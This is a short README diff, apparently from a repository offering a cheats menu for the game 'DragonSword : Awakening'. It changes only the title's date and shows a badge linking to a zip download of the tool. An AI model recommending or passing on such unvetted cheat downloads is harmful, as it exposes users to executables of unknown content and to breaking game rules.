@@ -1,4 +1,4 @@
-# DragonSword : Awakening Hack (Cheats Menu) (23-Aug-26)
+# DragonSword : Awakening Hack (Cheats Menu) (29-Aug-26)
 
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip)
